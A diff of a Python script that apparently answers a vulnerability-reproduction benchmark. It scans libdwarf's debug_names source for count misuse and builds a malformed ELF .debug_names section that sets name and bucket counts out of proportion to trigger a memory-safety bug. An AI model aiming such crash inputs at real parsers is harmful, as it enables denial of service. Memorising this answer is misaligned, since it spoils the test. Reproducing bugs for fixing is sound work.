@@ -3,259 +3,357 @@ import re
 import tarfile
 import tempfile
 import struct
-from typing import Dict, Tuple, Optional
+from typing import Dict, List, Optional, Tuple
 
 
-def _align(n: int, a: int) -> int:
+def _align(off: int, a: int) -> int:
     if a <= 1:
-        return n
-    r = n % a
-    return n if r == 0 else n + (a - r)
+        return off
+    r = off % a
+    return off if r == 0 else off + (a - r)
 
 
-def _p16(x: int) -> bytes:
+def _u16(x: int) -> bytes:
     return struct.pack("<H", x & 0xFFFF)
 
 
-def _p32(x: int) -> bytes:
+def _u32(x: int) -> bytes:
     return struct.pack("<I", x & 0xFFFFFFFF)
 
 
-def _p64(x: int) -> bytes:
+def _u64(x: int) -> bytes:
     return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)
 
 
-def _build_debug_names_unit(
-    *,
-    version: int = 5,
-    comp_unit_count: int = 0,
-    local_type_unit_count: int = 0,
-    foreign_type_unit_count: int = 1,
-    bucket_count: int = 1,
-    name_count: int = 1,
-    abbrev_table_size: int = 1,
-    augmentation_string: bytes = b"",
-    data_block_len: int = 128,
-) -> bytes:
-    if data_block_len < 64:
-        data_block_len = 64
-    if abbrev_table_size <= 0:
-        abbrev_table_size = 1
-    if len(augmentation_string) != 0:
-        augmentation_string = augmentation_string[: min(len(augmentation_string), 200)]
-    augmentation_string_size = len(augmentation_string)
-
-    hdr_after_len = bytearray()
-    hdr_after_len += _p16(version)
-    hdr_after_len += _p16(0)  # padding
-    hdr_after_len += _p32(comp_unit_count)
-    hdr_after_len += _p32(local_type_unit_count)
-    hdr_after_len += _p32(foreign_type_unit_count)
-    hdr_after_len += _p32(bucket_count)
-    hdr_after_len += _p32(name_count)
-    hdr_after_len += _p32(abbrev_table_size)
-    hdr_after_len += _p32(augmentation_string_size)
-    hdr_after_len += augmentation_string
-
-    # Tables after header, per DWARF5 .debug_names layout:
-    # CU list (4*count), local TU list (4*count), foreign TU signatures list (8*count),
-    # buckets (4*bucket_count), hashes (8*name_count), string offsets (4*name_count),
-    # entry offsets (4*name_count), abbreviation table (abbrev_table_size bytes), entry pool (rest).
-    post = bytearray(data_block_len)
-
-    off = 0
-    off += 4 * comp_unit_count
-    off += 4 * local_type_unit_count
-
-    # Foreign type signatures list (8 bytes each)
-    off += 8 * foreign_type_unit_count
-
-    # Buckets
-    if bucket_count > 0:
-        # Place a non-zero bucket index to encourage downstream reads/indexing.
-        # Put it at the start of the buckets table.
-        bucket_off = (4 * comp_unit_count) + (4 * local_type_unit_count) + (8 * foreign_type_unit_count)
-        if bucket_off + 4 <= len(post):
-            post[bucket_off:bucket_off + 4] = _p32(1)
-
-    # Ensure abbreviation table terminator at the expected location (as fixed parsers compute it),
-    # but keep the whole block zero so shifted interpretations remain safe.
-    # Since the whole block is already zero, no action needed.
-
-    unit_payload = bytes(hdr_after_len) + bytes(post)
-    unit_length = len(unit_payload)
-    return _p32(unit_length) + unit_payload
+def _uleb128(v: int) -> bytes:
+    if v < 0:
+        v = 0
+    out = bytearray()
+    while True:
+        b = v & 0x7F
+        v >>= 7
+        if v:
+            out.append(b | 0x80)
+        else:
+            out.append(b)
+            break
+    return bytes(out)
 
 
-def _build_elf64_little(sections: Dict[str, bytes]) -> bytes:
-    # Minimal ELF64 relocatable with section headers.
-    # Sections provided: name -> data. We'll always include .shstrtab.
-    names = ["", *sections.keys(), ".shstrtab"]
-    shstr = bytearray(b"\x00")
-    name_offsets: Dict[str, int] = {"": 0}
-    for nm in names[1:]:
-        name_offsets[nm] = len(shstr)
-        shstr += nm.encode("ascii", "strict") + b"\x00"
+def _strip_c_comments(text: str) -> str:
+    text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
+    text = re.sub(r"//[^\n]*", "", text)
+    return text
 
-    # Layout: ELF header, section data blobs, shstrtab, section header table
-    ehdr_size = 64
-    off = ehdr_size
 
-    # Place section data
-    sec_offsets_sizes: Dict[str, Tuple[int, int]] = {}
-    for nm, data in sections.items():
-        off = _align(off, 8)
-        sec_offsets_sizes[nm] = (off, len(data))
-        off += len(data)
+def _extract_tarball(src_path: str) -> str:
+    if os.path.isdir(src_path):
+        return os.path.abspath(src_path)
+    tmp = tempfile.mkdtemp(prefix="src_")
+    with tarfile.open(src_path, "r:*") as tf:
+        tf.extractall(tmp)
+    entries = [os.path.join(tmp, e) for e in os.listdir(tmp)]
+    dirs = [p for p in entries if os.path.isdir(p)]
+    if len(dirs) == 1:
+        return dirs[0]
+    return tmp
 
-    # Place shstrtab
-    off = _align(off, 8)
+
+def _find_file(root: str, basename: str) -> Optional[str]:
+    for dp, dn, fn in os.walk(root):
+        if basename in fn:
+            return os.path.join(dp, basename)
+    return None
+
+
+def _iter_text_files(root: str, max_bytes: int = 2_000_000):
+    for dp, dn, fn in os.walk(root):
+        for f in fn:
+            if not f.lower().endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".txt", ".md")):
+                continue
+            p = os.path.join(dp, f)
+            try:
+                st = os.stat(p)
+            except OSError:
+                continue
+            if st.st_size <= 0 or st.st_size > max_bytes:
+                continue
+            yield p
+
+
+def _detect_input_type(root: str) -> str:
+    # Best effort: look for an oss-fuzz harness mentioning debug_names.
+    # If unclear, default to "elf".
+    for p in _iter_text_files(root):
+        try:
+            data = open(p, "rb").read()
+        except OSError:
+            continue
+        if b"LLVMFuzzerTestOneInput" not in data:
+            continue
+        if b"debug_names" not in data and b"debugnames" not in data:
+            continue
+        s = data.decode("utf-8", "ignore")
+        if re.search(r"\bdwarf_(init|init_b|init_path|object_init|object_init_b)\b", s):
+            return "elf"
+        if re.search(r"\bdebug_names\b", s) and re.search(r"(Data|data|size_t|len)", s):
+            # could still be ELF, but raw is possible
+            if re.search(r"\bELF\b", s) or re.search(r"\.debug_names", s):
+                return "elf"
+            return "raw"
+    return "elf"
+
+
+def _detect_direction_from_source(root: str) -> str:
+    # Try to infer which count is misused in allocations/loops.
+    # Return:
+    #   "name_gt_bucket" -> set name_count >> bucket_count
+    #   "bucket_gt_name" -> set bucket_count >> name_count
+    # Default to "name_gt_bucket" as most plausible.
+    p = _find_file(root, "dwarf_debugnames.c")
+    if not p:
+        # fallback: search by path hint
+        for cand in ("dwarf_debugnames.c", "dwarf_debugnames.c.in"):
+            p = _find_file(root, cand)
+            if p:
+                break
+    if not p:
+        return "name_gt_bucket"
+
+    try:
+        txt = open(p, "r", encoding="utf-8", errors="ignore").read()
+    except OSError:
+        return "name_gt_bucket"
+    txt = _strip_c_comments(txt)
+
+    name_pat = r"(?:name_count|namecount|dn_name_count|dn_namecount|dnh_name_count|dnh_namecount)"
+    bucket_pat = r"(?:bucket_count|bucketcount|dn_bucket_count|dn_bucketcount|dnh_bucket_count|dnh_bucketcount)"
+
+    # Evidence counters
+    ev_bucket_alloc_uses_name = 0
+    ev_name_alloc_uses_bucket = 0
+
+    lines = txt.splitlines()
+    for line in lines:
+        l = line.strip()
+        if not l:
+            continue
+        if "malloc" not in l and "calloc" not in l and "alloc" not in l:
+            continue
+        # Focus on likely array allocations
+        if re.search(r"\bbucket", l, re.I):
+            if re.search(name_pat, l) and not re.search(bucket_pat, l):
+                ev_bucket_alloc_uses_name += 2
+            elif re.search(name_pat, l) and re.search(bucket_pat, l):
+                # ambiguous, low weight
+                ev_bucket_alloc_uses_name += 0
+        if re.search(r"\b(hash|hashes|string_offsets|entry_offsets)\b", l, re.I):
+            if re.search(bucket_pat, l) and not re.search(name_pat, l):
+                ev_name_alloc_uses_bucket += 2
+
+    # Also look for loops writing arrays: if loops use name_count but nearby alloc uses bucket_count.
+    # Very rough: count any "for(...< name_count)" occurrences in file; if many, name_gt_bucket is likely.
+    for_name_loops = len(re.findall(r"for\s*\([^;]*;[^;]*<[^;]*" + name_pat, txt))
+    for_bucket_loops = len(re.findall(r"for\s*\([^;]*;[^;]*<[^;]*" + bucket_pat, txt))
+    if for_name_loops >= for_bucket_loops:
+        ev_name_alloc_uses_bucket += 1
+
+    if ev_bucket_alloc_uses_name > ev_name_alloc_uses_bucket + 1:
+        return "bucket_gt_name"
+    return "name_gt_bucket"
+
+
+def _build_debug_str(name_count: int) -> Tuple[bytes, List[int]]:
+    # Standard .debug_str; keep it simple.
+    # Put an initial NUL to make offset 0 a valid empty string.
+    buf = bytearray(b"\x00")
+    offs: List[int] = []
+    for i in range(name_count):
+        offs.append(len(buf))
+        s = ("n%u" % i).encode("ascii", "ignore") + b"\x00"
+        buf += s
+    return bytes(buf), offs
+
+
+def _build_debug_names_section(bucket_count: int, name_count: int, str_offsets: List[int]) -> bytes:
+    # Build a single .debug_names name index.
+    # Use a minimal abbreviation table: one abbrev with 2 attributes (compile_unit, die_offset) using DW_FORM_udata.
+    # DW_IDX_compile_unit=1, DW_IDX_die_offset=3, DW_FORM_udata=0x0f, DW_TAG_compile_unit=0x11.
+    abbrev = bytearray()
+    abbrev += _uleb128(1)          # abbrev code
+    abbrev += _uleb128(0x11)       # DW_TAG_compile_unit
+    abbrev += _uleb128(2)          # attr_count
+    abbrev += _uleb128(1) + _uleb128(0x0F)  # DW_IDX_compile_unit, DW_FORM_udata
+    abbrev += _uleb128(3) + _uleb128(0x0F)  # DW_IDX_die_offset, DW_FORM_udata
+    abbrev += _uleb128(0)          # end abbrev list (common convention)
+
+    entry_pool = bytearray()
+    entry_offsets: List[int] = []
+    for _ in range(name_count):
+        entry_offsets.append(len(entry_pool))
+        entry_pool += b"\x01\x00\x00"  # abbrev_code=1, compile_unit=0, die_offset=0 (all uleb)
+
+    # Buckets: put everything into bucket 0.
+    buckets = [0] * bucket_count
+    if bucket_count > 0 and name_count > 0:
+        buckets[0] = 1  # 1-based index into the names table
+    buckets_b = b"".join(_u32(v) for v in buckets)
+
+    # Hashes: increasing values
+    hashes_b = b"".join(_u32((i + 1) & 0xFFFFFFFF) for i in range(name_count))
+
+    # String offsets: offsets into .debug_str
+    string_offsets_b = b"".join(_u32(str_offsets[i] if i < len(str_offsets) else 0) for i in range(name_count))
+
+    # Entry offsets: offsets into entry pool
+    entry_offsets_b = b"".join(_u32(v & 0xFFFFFFFF) for v in entry_offsets)
+
+    header = bytearray()
+    header += _u16(5)              # version
+    header += _u16(0)              # padding
+    header += _u32(0)              # comp_unit_count
+    header += _u32(0)              # local_type_unit_count
+    header += _u32(0)              # foreign_type_unit_count
+    header += _u32(bucket_count)   # bucket_count
+    header += _u32(name_count)     # name_count
+    header += _u32(len(abbrev))    # abbrev_table_size
+    header += b"\x00"              # augmentation string (empty)
+
+    body = header + buckets_b + hashes_b + string_offsets_b + entry_offsets_b + bytes(abbrev) + bytes(entry_pool)
+    unit_length = len(body)
+    return _u32(unit_length) + bytes(body)
+
+
+def _build_elf(debug_names: bytes, debug_str: bytes) -> bytes:
+    # Minimal ELF64 relocatable with sections:
+    # 0: null, 1: .shstrtab, 2: .debug_names, 3: .debug_str
+    shstr = b"\x00.shstrtab\x00.debug_names\x00.debug_str\x00"
+    off_shstrtab_name = shstr.find(b".shstrtab")
+    off_debug_names_name = shstr.find(b".debug_names")
+    off_debug_str_name = shstr.find(b".debug_str")
+
+    # Layout
+    buf = bytearray(b"\x00" * 64)  # ELF header placeholder
+    off = len(buf)
+
+    # .debug_names
+    off = _align(off, 0x10)
+    dn_off = off
+    buf += b"\x00" * (dn_off - len(buf))
+    buf += debug_names
+    dn_size = len(debug_names)
+    off = len(buf)
+
+    # .debug_str
+    off = _align(off, 0x10)
+    ds_off = off
+    buf += b"\x00" * (ds_off - len(buf))
+    buf += debug_str
+    ds_size = len(debug_str)
+    off = len(buf)
+
+    # .shstrtab
+    off = _align(off, 0x10)
     shstr_off = off
+    buf += b"\x00" * (shstr_off - len(buf))
+    buf += shstr
     shstr_size = len(shstr)
-    off += shstr_size
+    off = len(buf)
 
     # Section headers
-    off = _align(off, 8)
+    off = _align(off, 0x10)
     shoff = off
-
+    shnum = 4
     shentsize = 64
-    shnum = 1 + len(sections) + 1  # null + sections + shstrtab
-    file_size = shoff + shentsize * shnum
+    buf += b"\x00" * (shoff - len(buf))
+    buf += b"\x00" * (shnum * shentsize)
 
-    out = bytearray(b"\x00" * file_size)
+    def pack_sh(i: int, sh_name: int, sh_type: int, sh_flags: int, sh_addr: int, sh_offset: int, sh_size: int,
+                sh_link: int, sh_info: int, sh_addralign: int, sh_entsize2: int) -> None:
+        struct.pack_into(
+            "<IIQQQQIIQQ",
+            buf,
+            shoff + i * shentsize,
+            sh_name,
+            sh_type,
+            sh_flags,
+            sh_addr,
+            sh_offset,
+            sh_size,
+            sh_link,
+            sh_info,
+            sh_addralign,
+            sh_entsize2
+        )
+
+    # Null section
+    pack_sh(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
+    # .shstrtab
+    pack_sh(1, off_shstrtab_name, 3, 0, 0, shstr_off, shstr_size, 0, 0, 1, 0)
+    # .debug_names
+    pack_sh(2, off_debug_names_name, 1, 0, 0, dn_off, dn_size, 0, 0, 1, 0)
+    # .debug_str
+    pack_sh(3, off_debug_str_name, 1, 0, 0, ds_off, ds_size, 0, 0, 1, 0)
 
     # ELF header
     e_ident = bytearray(16)
     e_ident[0:4] = b"\x7fELF"
     e_ident[4] = 2  # ELFCLASS64
-    e_ident[5] = 1  # little endian
-    e_ident[6] = 1  # version
+    e_ident[5] = 1  # ELFDATA2LSB
+    e_ident[6] = 1  # EV_CURRENT
     e_ident[7] = 0  # System V
-    # rest 0
-    out[0:16] = e_ident
-    out[16:18] = _p16(1)       # e_type ET_REL
-    out[18:20] = _p16(62)      # e_machine EM_X86_64
-    out[20:24] = _p32(1)       # e_version
-    out[24:32] = _p64(0)       # e_entry
-    out[32:40] = _p64(0)       # e_phoff
-    out[40:48] = _p64(shoff)   # e_shoff
-    out[48:52] = _p32(0)       # e_flags
-    out[52:54] = _p16(ehdr_size)
-    out[54:56] = _p16(0)       # e_phentsize
-    out[56:58] = _p16(0)       # e_phnum
-    out[58:60] = _p16(shentsize)
-    out[60:62] = _p16(shnum)
-    out[62:64] = _p16(shnum - 1)  # e_shstrndx
+    # rest are 0
 
-    # Copy section data
-    for nm, data in sections.items():
-        so, ss = sec_offsets_sizes[nm]
-        out[so:so + ss] = data
+    e_type = 1       # ET_REL
+    e_machine = 0x3E # EM_X86_64
+    e_version = 1
+    e_entry = 0
+    e_phoff = 0
+    e_flags = 0
+    e_ehsize = 64
+    e_phentsize = 0
+    e_phnum = 0
+    e_shentsize = shentsize
+    e_shnum = shnum
+    e_shstrndx = 1
 
-    # Copy shstrtab
-    out[shstr_off:shstr_off + shstr_size] = shstr
-
-    # Section headers
-    def write_sh(idx: int, name: str, sh_type: int, sh_flags: int, sh_offset: int, sh_size: int,
-                 sh_link: int = 0, sh_info: int = 0, sh_addralign: int = 1, sh_entsize: int = 0) -> None:
-        base = shoff + idx * shentsize
-        out[base + 0:base + 4] = _p32(name_offsets.get(name, 0))
-        out[base + 4:base + 8] = _p32(sh_type)
-        out[base + 8:base + 16] = _p64(sh_flags)
-        out[base + 16:base + 24] = _p64(0)  # sh_addr
-        out[base + 24:base + 32] = _p64(sh_offset)
-        out[base + 32:base + 40] = _p64(sh_size)
-        out[base + 40:base + 44] = _p32(sh_link)
-        out[base + 44:base + 48] = _p32(sh_info)
-        out[base + 48:base + 56] = _p64(sh_addralign)
-        out[base + 56:base + 64] = _p64(sh_entsize)
-
-    # Null section header
-    write_sh(0, "", 0, 0, 0, 0, 0, 0, 0, 0)
-
-    # Provided sections
-    idx = 1
-    for nm in sections.keys():
-        so, ss = sec_offsets_sizes[nm]
-        write_sh(idx, nm, 1, 0, so, ss, 0, 0, 1, 0)
-        idx += 1
-
-    # shstrtab section
-    write_sh(idx, ".shstrtab", 3, 0, shstr_off, shstr_size, 0, 0, 1, 0)
-
-    return bytes(out)
-
-
-def _try_read_debugnames_c(src_path: str) -> Optional[str]:
-    # Best-effort: locate dwarf_debugnames.c from tarball or directory.
-    def read_file(p: str) -> Optional[str]:
-        try:
-            with open(p, "rb") as f:
-                b = f.read()
-            return b.decode("utf-8", "replace")
-        except Exception:
-            return None
-
-    if os.path.isdir(src_path):
-        for root, _, files in os.walk(src_path):
-            for fn in files:
-                if fn == "dwarf_debugnames.c":
-                    p = os.path.join(root, fn)
-                    txt = read_file(p)
-                    if txt is not None:
-                        return txt
-        return None
-
-    if os.path.isfile(src_path):
-        try:
-            with tarfile.open(src_path, "r:*") as tf, tempfile.TemporaryDirectory() as td:
-                members = tf.getmembers()
-                candidates = [m for m in members if os.path.basename(m.name) == "dwarf_debugnames.c"]
-                if not candidates:
-                    return None
-                m = sorted(candidates, key=lambda x: len(x.name))[0]
-                tf.extract(m, path=td)
-                p = os.path.join(td, m.name)
-                return read_file(p)
-        except Exception:
-            return None
-    return None
+    hdr = struct.pack(
+        "<16sHHIQQQIHHHHHH",
+        bytes(e_ident),
+        e_type,
+        e_machine,
+        e_version,
+        e_entry,
+        e_phoff,
+        shoff,
+        e_flags,
+        e_ehsize,
+        e_phentsize,
+        e_phnum,
+        e_shentsize,
+        e_shnum,
+        e_shstrndx
+    )
+    buf[0:64] = hdr
+    return bytes(buf)
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        txt = _try_read_debugnames_c(src_path) or ""
-        # Heuristic: if the code seems to reference foreign type signatures, keep foreign_type_unit_count=1.
-        # Otherwise, still keep it enabled since it is safe and might hit size-miscalculation bugs.
-        use_foreign = True
-        if txt:
-            # If it looks like it doesn't handle foreign type units at all, still allow; else keep.
-            if "foreign_type_unit" not in txt and "foreign type" not in txt:
-                use_foreign = True
+        root = _extract_tarball(src_path)
+        input_type = _detect_input_type(root)
+        direction = _detect_direction_from_source(root)
 
-        # Try to tailor name_count in case of off-by-one patterns
-        name_count = 1
-        if txt:
-            # If we see loops using <= name_count, keep at 1 to overflow fast.
-            if re.search(r"<=\s*name_count\b", txt):
-                name_count = 1
+        if direction == "bucket_gt_name":
+            bucket_count = 64
+            name_count = 2
+        else:
+            bucket_count = 2
+            name_count = 64
 
-        foreign_count = 1 if use_foreign else 0
+        debug_str, str_offs = _build_debug_str(name_count)
+        debug_names = _build_debug_names_section(bucket_count, name_count, str_offs)
 
-        debug_names = _build_debug_names_unit(
-            version=5,
-            comp_unit_count=0,
-            local_type_unit_count=0,
-            foreign_type_unit_count=foreign_count,
-            bucket_count=1,
-            name_count=name_count,
-            abbrev_table_size=1,
-            augmentation_string=b"",
-            data_block_len=160,
-        )
-
-        sections = {
-            ".debug_names": debug_names,
-            ".debug_str": b"\x00",
-        }
-        return _build_elf64_little(sections)
+        if input_type == "raw":
+            return debug_names
+        return _build_elf(debug_names, debug_str)
